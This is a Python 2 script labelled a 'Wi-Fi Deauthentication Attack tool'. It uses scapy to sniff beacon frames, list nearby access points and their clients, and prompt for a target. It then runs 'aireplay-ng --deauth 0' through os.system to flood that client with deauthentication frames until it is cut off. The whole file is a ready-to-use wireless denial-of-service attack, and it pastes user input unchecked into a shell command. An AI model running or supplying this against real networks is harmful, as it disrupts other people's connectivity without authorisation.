#!/usr/bin/env python
import os
from scapy.config import conf
conf.ipv6_enabled = False
from scapy.all import sniff, Dot11
import importlib
from prettytable import PrettyTable
from scapy.all import *
a=os.system
interface = ''
b_cast_mac = 'ff:ff:ff:ff:ff:ff'
aps_dic = {}


x = PrettyTable()
x.field_names = ["Ap Mac", "SSID"]
y = PrettyTable()
y.field_names = ["STA Mac", "SSID"]

def beacon_packet_handler(pkt) :
    if not pkt.haslayer(Dot11):
        return

    if pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in aps_dic:
        aps_dic[pkt.addr2] ={
            'SSID': pkt.info,
            'STA': [],
        }
        x.add_row([pkt.addr2, pkt.info])
    elif (pkt.addr2 in aps_dic and pkt.addr1 != b_cast_mac and
          pkt.addr1 not in aps_dic[pkt.addr2]['STA']):
          aps_dic[pkt.addr2]['STA'].append(pkt.addr1)


def main():
    interface = sys.argv[1]
    print '\033[1;31m                          Wi-Fi Deauthentication Attack tool\033[1;m'
    print '                             looking for AP Please wait '
    sniff(iface=interface, prn=beacon_packet_handler, store=False, timeout=10)
    print x, '\n'
    ssid_mac = raw_input('Please enter the SSID mac : \n')
    print 'great !  -> %s \n' % ssid_mac
    ssid = raw_input('Please enter the SSID name: \n')
    print 'finding users in the ssid name -> %s ...\n' % ssid

    for ap_mac in aps_dic:
        ap_dic = aps_dic[ap_mac]
        if ap_dic['SSID'] == ssid:
            for addr in ap_dic['STA']:
                y.add_row([addr, ssid])
            # The break here is under the assuption that there is only
            # one AP with the same SSID
            break

    print y

    mac_client = raw_input('Please enter the mac name for the attack: \n')
    print 'making attack for mac -> %s \n' % mac_client
    
    test = 'aireplay-ng --deauth '+str(0)+' -c '+mac_client+' -a '+ssid_mac+' '+interface+''
    a(test)

    
if __name__ == '__main__':
    main()







